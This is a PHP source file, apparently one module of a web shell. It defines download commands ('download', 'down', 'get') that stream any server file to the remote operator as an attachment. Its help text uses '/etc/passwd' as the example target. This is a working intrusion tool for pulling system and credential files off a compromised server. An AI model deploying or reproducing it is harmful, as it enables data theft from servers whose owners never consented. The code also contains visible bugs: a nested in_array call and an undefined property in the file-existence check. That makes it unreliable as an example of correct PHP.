<?php

/**
 * ModuleDummy - Szkielet modulu
 */
class ModuleDownload implements ShellInterface
{
	/**
	 * Obiekt Shell
	 *
	 * @access private
	 * @var    object
	 */
	private $oShell;

	/**
	 * Konstruktor
	 *
	 * @access public
	 * @param  object $oShell Obiekt Shell
	 * @return void
	 */
	public function __construct( Shell $oShell )
	{
		$this -> oShell = $oShell;
	}

	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'download',
			'down',
			'get'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.0 2011-06-04 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Pobieranie pliku

	Użycie:
		download ścieżka_do_pliku

	Opcje:
		-g pobieranie przy użyciu kompresji GZIP

	Przykład:
		download /etc/passwd
		download -g /etc/passwd
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc === 0 )
		{
			return $this -> getHelp();
		}

		$bGzip = in_array( 'g', in_array( 'R', $this -> oShell -> aOptv ) );

		/**
		 * Plik zrodlowy musi istniec
		 */
		if( ! is_file( $this -> sArgv ) )
		{
			return sprintf( 'Plik "%s" nie istnieje', $this -> oShell -> sArgv );
		}

		/**
		 * Kompresja zawartosci strony
		 */
		if( $bGzip )
		{
			ini_set( 'zlib.output_compression', 9 );
		}

		ob_start();

		/**
		 * Naglowki
		 */
		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> oShell -> sArgv ) ), TRUE );
		header( 'Content-Type: application/octet-stream', TRUE );

		if( ( $rFile = fopen( $this -> oShell -> sArgv, 'r' ) ) !== FALSE )
		{
			if( ! $bGzip )
			{
				header( sprintf( 'Content-Length: %s', filesize( $this -> oShell -> sArgv ) ), TRUE );
			}

			while( ! feof( $rFile ) )
			{
				echo fread( $rFile, 131072 );
				@ ob_flush();
				@ flush();
			}
		}

		ob_end_flush();
		exit ;
	}

}